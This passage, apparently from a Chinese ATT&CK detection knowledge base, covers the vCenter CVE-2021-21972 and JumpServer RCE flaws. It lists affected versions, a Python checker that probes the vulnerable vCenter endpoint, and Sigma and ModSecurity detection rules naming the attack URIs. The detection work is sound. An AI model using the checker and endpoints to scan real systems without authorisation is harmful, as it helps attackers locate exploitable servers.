\u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b 2021\u5e7402\u670824\u65e5\uff0c\u67d0\u4e9b\u5e73\u53f0\u76d1\u6d4b\u5230 Vmware\u5b98\u65b9\u53d1\u5e03\u4e86vCenter Server\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86vSphereClient (HTML5)\u5728vCenter Server\u63d2\u4ef6vRealizeOperations\uff08vROps\uff09\u4e2d\u7684\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-21972\uff09\u3002VMware vCenter Server\u662f\u7f8e\u56fd\u5a01\u777f\uff08VMware\uff09\u516c\u53f8\u7684\u4e00\u5957\u670d\u52a1\u5668\u548c\u865a\u62df\u5316\u7ba1\u7406\u8f6f\u4ef6\u3002\u8be5\u8f6f\u4ef6\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406VMware vCenter\u73af\u5883\u7684\u96c6\u4e2d\u5f0f\u5e73\u53f0\uff0c\u53ef\u81ea\u52a8\u5b9e\u65bd\u548c\u4ea4\u4ed8\u865a\u62df\u57fa\u7840\u67b6\u6784\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u8bbf\u95eeweb\u7ba1\u7406\u7aef\u5411vCenter Server\u53d1\u9001\u8bf7\u6c42\u4ece\u800c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u6216\u8005\u4e0a\u4f20\u4e00\u4e2awebshell\u5230vcenter\u670d\u52a1\u5668\u7684\u4efb\u610f\u4f4d\u7f6e\u6267\u884c \u5177\u6709\u7f51\u7edc\u8bbf\u95ee\u7aef\u53e3443\u7684\u6076\u610f\u884c\u4e3a\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u95ee\u9898\u5728\u6258\u7ba1vCenter Server\u7684\u57fa\u7840\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u4ee5\u4e0d\u53d7\u9650\u5236\u7684\u7279\u6743\u6267\u884c\u547d\u4ee4\u3002\u8fd9\u4f1a\u5f71\u54cdVMware vCenter Server\uff087.0 U1c\u4e4b\u524d\u76847.x\uff0c6.7 U3l\u4e4b\u524d\u76846.7\u548c6.5 U3n\u4e4b\u524d\u76846.5\uff09\u548cVMware Cloud Foundation\uff084.2.3\u4e4b\u524d\u76844.x\u548c3.10.1.2\u4e4b\u524d\u76843.x\uff09\u3002 \u6b64\u5916\uff0cVMware\u8fd8\u4fee\u590d\u4e86VMware ESXi\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff08CVE-2021-21974\uff09\u4e0eVMware vSphere\u4e2d\u7684\u4e00\u4e2aSSRF\u6f0f\u6d1e\uff08CVE-2021-21973\uff09\u3002 0x1 \u5f71\u54cd\u7248\u672c VMware vCenter Server 7.0\u7cfb\u5217 < 7.0.U1c VMware vCenter Server 6.7\u7cfb\u5217 < 6.7.U3l VMware vCenter Server 6.5\u7cfb\u5217 < 6.5 U3n VMware ESXi 7.0\u7cfb\u5217 < ESXi70U1c-17325551 VMware ESXi 6.7\u7cfb\u5217 < ESXi670-202102401-SG VMware ESXi 6.5\u7cfb\u5217 < ESXi650-202102101-SG 0x2 \u6f0f\u6d1e\u8be6\u60c5 \u53ef\u53c2\u8003\uff1a CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e\uff1a https://blog.csdn.net/weixin_43650289/article/details/114055417 CVE-2021-21972 vCenter \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\uff1a https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc CVE-2021-21972-vCenter-6.5-7.0-RCE-POC\uff1a https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py \u68c0\u6d4b\u65e5\u5fd7 HTTP.log\uff0c\u4e3b\u8981\u662f\u57fa\u4e8ePOC\u62a5\u6587\u8fdb\u884c\u68c0\u6d4b\uff0cPOC\u5982\u4e0b\uff1a import requests from requests.packages import urllib3 urllib3.disable_warnings() import argparse import os def url(): parser = argparse.ArgumentParser(description='vCenter 6.5-7.0 RCE \u6f0f\u6d1e\u590d\u73b0(CVE-2021-21972)POC') parser.add_argument('target_url',type=str,help='The target address,example: https://192.168.140.153:4445') args = parser.parse_args() global url url = args.target_url if url.startswith('http://') or url.startswith('https://'): pass else: print('[-]Please include http:// or https:// in the URL!!') os._exit(0) if url.endswith('/'): url = url[:-1] print('[+]author:chenchen') print(\"[-]\u76ee\u6807\u5730\u5740:\",url) print(\"[-]\u6b63\u5728\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b...\") return url def poc(): headers={ 'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', \"Content-Type\":\"application/x-www-form-urlencoded\" } url_v = url + '/ui/vropspluginui/rest/services/updateova' try: code = requests.get(url=url_v,headers=headers,timeout=4,verify=False).status_code print('status_code:',code) if code == 405: print('[+]\u6f0f\u6d1e\u5b58\u5728') else: print('[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728') except: print('[-]\u53d1\u751f\u9519\u8bef') if __name__ == '__main__': url() poc() \u6d4b\u8bd5\u590d\u73b0 \u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e status: \u6d4b\u8bd5\u72b6\u6001 description: \u57fa\u4e8eHTTP\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b references: - https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc - https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py logsource: category: webserver #http_log detection: selection: cs-method: 'POST' #\u8bf7\u6c42\u65b9\u6cd5\u4e3apost c-uri: #\u8bf7\u6c42url\u4e2d\u5305\u542b\u4ee5\u4e0b\u8def\u5f84 - '/ui/vropspluginui/rest/services/uploadova' condition: selection fields: - c-ip - c-dns falsepositives: - OVA uploads to your VSphere appliance level: high \u5efa\u8bae \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907(\u5982\u5929\u773c\u7b49)\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e https://blog.csdn.net/weixin_43650289/article/details/114055417 CVE-2021-21972 vCenter\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790 https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc CVE-2021-21972-vCenter-6.5-7.0-RCE-POC https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py","title":"T1190-CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#t1190-cve-2021-21972-vmware-vcenterrce","text":"","title":"T1190-CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_1","text":"2021\u5e7402\u670824\u65e5\uff0c\u67d0\u4e9b\u5e73\u53f0\u76d1\u6d4b\u5230 Vmware\u5b98\u65b9\u53d1\u5e03\u4e86vCenter Server\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86vSphereClient (HTML5)\u5728vCenter Server\u63d2\u4ef6vRealizeOperations\uff08vROps\uff09\u4e2d\u7684\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-21972\uff09\u3002VMware vCenter Server\u662f\u7f8e\u56fd\u5a01\u777f\uff08VMware\uff09\u516c\u53f8\u7684\u4e00\u5957\u670d\u52a1\u5668\u548c\u865a\u62df\u5316\u7ba1\u7406\u8f6f\u4ef6\u3002\u8be5\u8f6f\u4ef6\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406VMware vCenter\u73af\u5883\u7684\u96c6\u4e2d\u5f0f\u5e73\u53f0\uff0c\u53ef\u81ea\u52a8\u5b9e\u65bd\u548c\u4ea4\u4ed8\u865a\u62df\u57fa\u7840\u67b6\u6784\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u8bbf\u95eeweb\u7ba1\u7406\u7aef\u5411vCenter Server\u53d1\u9001\u8bf7\u6c42\u4ece\u800c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u6216\u8005\u4e0a\u4f20\u4e00\u4e2awebshell\u5230vcenter\u670d\u52a1\u5668\u7684\u4efb\u610f\u4f4d\u7f6e\u6267\u884c \u5177\u6709\u7f51\u7edc\u8bbf\u95ee\u7aef\u53e3443\u7684\u6076\u610f\u884c\u4e3a\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u95ee\u9898\u5728\u6258\u7ba1vCenter Server\u7684\u57fa\u7840\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u4ee5\u4e0d\u53d7\u9650\u5236\u7684\u7279\u6743\u6267\u884c\u547d\u4ee4\u3002\u8fd9\u4f1a\u5f71\u54cdVMware vCenter Server\uff087.0 U1c\u4e4b\u524d\u76847.x\uff0c6.7 U3l\u4e4b\u524d\u76846.7\u548c6.5 U3n\u4e4b\u524d\u76846.5\uff09\u548cVMware Cloud Foundation\uff084.2.3\u4e4b\u524d\u76844.x\u548c3.10.1.2\u4e4b\u524d\u76843.x\uff09\u3002 \u6b64\u5916\uff0cVMware\u8fd8\u4fee\u590d\u4e86VMware ESXi\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff08CVE-2021-21974\uff09\u4e0eVMware vSphere\u4e2d\u7684\u4e00\u4e2aSSRF\u6f0f\u6d1e\uff08CVE-2021-21973\uff09\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#0x1","text":"VMware vCenter Server 7.0\u7cfb\u5217 < 7.0.U1c VMware vCenter Server 6.7\u7cfb\u5217 < 6.7.U3l VMware vCenter Server 6.5\u7cfb\u5217 < 6.5 U3n VMware ESXi 7.0\u7cfb\u5217 < ESXi70U1c-17325551 VMware ESXi 6.7\u7cfb\u5217 < ESXi670-202102401-SG VMware ESXi 6.5\u7cfb\u5217 < ESXi650-202102101-SG","title":"0x1 \u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#0x2","text":"\u53ef\u53c2\u8003\uff1a CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e\uff1a https://blog.csdn.net/weixin_43650289/article/details/114055417 CVE-2021-21972 vCenter \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\uff1a https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc CVE-2021-21972-vCenter-6.5-7.0-RCE-POC\uff1a https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py","title":"0x2 \u6f0f\u6d1e\u8be6\u60c5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_2","text":"HTTP.log\uff0c\u4e3b\u8981\u662f\u57fa\u4e8ePOC\u62a5\u6587\u8fdb\u884c\u68c0\u6d4b\uff0cPOC\u5982\u4e0b\uff1a import requests from requests.packages import urllib3 urllib3.disable_warnings() import argparse import os def url(): parser = argparse.ArgumentParser(description='vCenter 6.5-7.0 RCE \u6f0f\u6d1e\u590d\u73b0(CVE-2021-21972)POC') parser.add_argument('target_url',type=str,help='The target address,example: https://192.168.140.153:4445') args = parser.parse_args() global url url = args.target_url if url.startswith('http://') or url.startswith('https://'): pass else: print('[-]Please include http:// or https:// in the URL!!') os._exit(0) if url.endswith('/'): url = url[:-1] print('[+]author:chenchen') print(\"[-]\u76ee\u6807\u5730\u5740:\",url) print(\"[-]\u6b63\u5728\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b...\") return url def poc(): headers={ 'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', \"Content-Type\":\"application/x-www-form-urlencoded\" } url_v = url + '/ui/vropspluginui/rest/services/updateova' try: code = requests.get(url=url_v,headers=headers,timeout=4,verify=False).status_code print('status_code:',code) if code == 405: print('[+]\u6f0f\u6d1e\u5b58\u5728') else: print('[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728') except: print('[-]\u53d1\u751f\u9519\u8bef') if __name__ == '__main__': url() poc()","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_3","text":"\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#sigma","text":"title: CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e status: \u6d4b\u8bd5\u72b6\u6001 description: \u57fa\u4e8eHTTP\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b references: - https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc - https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py logsource: category: webserver #http_log detection: selection: cs-method: 'POST' #\u8bf7\u6c42\u65b9\u6cd5\u4e3apost c-uri: #\u8bf7\u6c42url\u4e2d\u5305\u542b\u4ee5\u4e0b\u8def\u5f84 - '/ui/vropspluginui/rest/services/uploadova' condition: selection fields: - c-ip - c-dns falsepositives: - OVA uploads to your VSphere appliance level: high","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_5","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907(\u5982\u5929\u773c\u7b49)\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_6","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e https://blog.csdn.net/weixin_43650289/article/details/114055417 CVE-2021-21972 vCenter\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790 https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc CVE-2021-21972-vCenter-6.5-7.0-RCE-POC https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/","text":"T1190-JumpServer v2.6.1 RCE\u653b\u51fb\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) JumpServer \u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u5821\u5792\u673a\uff0c\u662f\u7b26\u54084A\u89c4\u8303\u7684\u8fd0\u7ef4\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\uff0c\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\u8df3\u677f\u673a. 2021\u5e741\u670815\u65e5\uff0cJumpServer \u53d1\u5e03\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u7531\u4e8e JumpServer\u67d0\u4e9b\u63a5\u53e3\u672a\u505a\u6388\u6743\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6216\u8005\u6267\u884c\u76f8\u5173\u64cd\u4f5c\u63a7\u5236\u5176\u4e2d\u6240\u6709\u673a\u5668\uff0c\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c JumpServer < v2.6.2 JumpServer < v2.5.4 JumpServer < v2.4.5 JumpServer = v1.5.9 \u6d4b\u8bd5\u6848\u4f8b \u8bf7\u53c2\u8003\uff1a JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3 https://www.cnblogs.com/w0x68y/p/14340249.html Jumpserver-RCE\u590d\u73b0\u53ca\u544a\u8b66\u89c4\u5219 https://www.freebuf.com/vuls/261199.html \u68c0\u6d4b\u65e5\u5fd7 \u8bbf\u95ee\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u8bf7\u53c2\u8003\uff1a JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3 https://www.cnblogs.com/w0x68y/p/14340249.html \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def modsecurity\u5224\u5b9a\u89c4\u5219 \u5728\u8fd9\u79cd\u573a\u666f\u4e0b\uff0c\u57fa\u672c\u4e0a\u770b\u5230\u8fd9\u4e2auri\u8bf7\u6c42\u6211\u4eec\u5c31\u53ef\u4ee5\u65ad\u8a00\u8fd9\u662f\u4e00\u4e2a\u62a5\u8b66\uff0c\u56e0\u6b64\u7f16\u5199\u89c4\u5219\u5982\u4e0b: SecRule REQUEST_URI \"/ws/ops/tasks/log\" \"id:11111111,phase:1,id:52,t:none,t:urlDecode,t:lowercase,t:normalizePath,msg:'jump-rce'\" \u5907\u6ce8 \u672c\u6587\u5185\u5bb9\u591a\u6570\u6458\u81ea\u4e92\u8054\u7f51\u7f51\u7edc\uff0c\u672a\u7ecf\u8fc7\u672c\u4eba\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\uff0c\u614e\u91cd\u4e0a\u7ebf\u4f7f\u7528\u3002 